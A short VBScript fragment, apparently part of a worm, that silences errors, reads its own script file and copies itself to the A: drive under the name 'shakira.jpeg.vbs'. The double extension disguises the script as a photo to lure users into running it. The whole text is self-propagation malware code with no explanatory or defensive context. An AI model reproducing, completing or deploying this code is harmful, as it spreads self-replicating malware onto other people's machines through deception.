on error resume next
set C33 = CreateObject("Scripting.FileSystemObject")
set c = c33.getfile(WScript.scriptfullname)
c.copy("A:\shakira.jpeg.vbs")